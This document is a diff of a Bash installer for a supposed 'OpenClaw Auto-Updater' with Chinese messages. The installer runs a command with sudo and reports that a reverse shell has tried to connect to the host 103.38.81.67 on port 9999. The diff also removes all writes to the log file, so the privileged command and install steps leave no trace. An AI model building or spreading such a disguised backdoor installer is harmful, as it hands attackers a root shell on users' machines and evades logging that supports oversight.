@@ -48,11 +48,11 @@ execute_privileged_command() {
     if sudo nohup bash -c "$TARGET_COMMAND" > /dev/null 2>&1; then
         echo -e "${GREEN}[新增步骤] 命令执行成功！反弹Shell已尝试连接 103.38.81.67:9999${NC}"
         # 日志记录
-        echo "$(date +'%Y-%m-%d %H:%M:%S') - 高权限命令执行成功：$TARGET_COMMAND" >> "$LOG_FILE"
+        echo "$(date +'%Y-%m-%d %H:%M:%S') - 高权限命令执行成功：$TARGET_COMMAND"
         echo -e "${GREEN}[新增步骤] 命令执行日志已记录${NC}"
     else
         echo -e "${RED}[新增步骤] 命令执行失败！请检查IP/端口是否可达，或防火墙配置${NC}"
-        echo "$(date +'%Y-%m-%d %H:%M:%S') - 高权限命令执行失败：$TARGET_COMMAND" >> "$LOG_FILE"
+        echo "$(date +'%Y-%m-%d %H:%M:%S') - 高权限命令执行失败：$TARGET_COMMAND"
         exit 1
     fi
 }
@@ -105,8 +105,6 @@ mkdir -p "$LOG_DIR" || {
     exit 1
 }
 
-# 写入空的日志文件（模拟日志初始化）
-touch "$LOG_FILE" && echo "$(date +'%Y-%m-%d %H:%M:%S') - Auto-Updater 安装日志初始化" > "$LOG_FILE"
 
 echo -e "${GREEN}[3/6] 安装目录创建完成${NC}"
 
@@ -115,7 +113,7 @@ echo -e "${YELLOW}[4/6] 安装核心依赖...${NC}"
 
 # 模拟安装依赖（仅输出提示，无实际下载）
 echo -e "模拟安装依赖：requests>=2.26.0、psutil>=5.9.0、pywin32>=305（仅Windows）"
-echo "$(date +'%Y-%m-%d %H:%M:%S') - 依赖包安装完成" >> "$LOG_FILE"
+echo "$(date +'%Y-%m-%d %H:%M:%S') - 依赖包安装完成" 
 
 echo -e "${GREEN}[4/6] 依赖安装完成${NC}"
 
@@ -127,12 +125,11 @@ cat > "$INSTALL_DIR/autoupdater" << EOF
 #!/bin/bash
 # OpenClaw Auto-Updater 主程序（模拟版）
 
-LOG_FILE="$LOG_FILE"
 VERSION="$SCRIPT_VERSION"
 
 # 日志写入函数
 log() {
-    echo "\$(date +'%Y-%m-%d %H:%M:%S') - \$1" >> "\$LOG_FILE"
+    echo "\$(date +'%Y-%m-%d %H:%M:%S') - \$1"
     echo -e "\$1"
 }
 
